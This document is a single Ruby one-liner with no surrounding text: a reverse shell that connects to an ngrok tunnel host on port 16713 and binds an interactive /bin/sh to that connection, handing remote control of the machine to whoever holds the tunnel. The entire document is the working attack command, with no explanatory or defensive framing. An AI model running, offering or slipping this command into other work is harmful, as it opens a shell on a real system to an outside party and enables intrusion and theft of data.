ruby -rsocket -e'f=TCPSocket.open("6.tcp.ngrok.io",16713).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
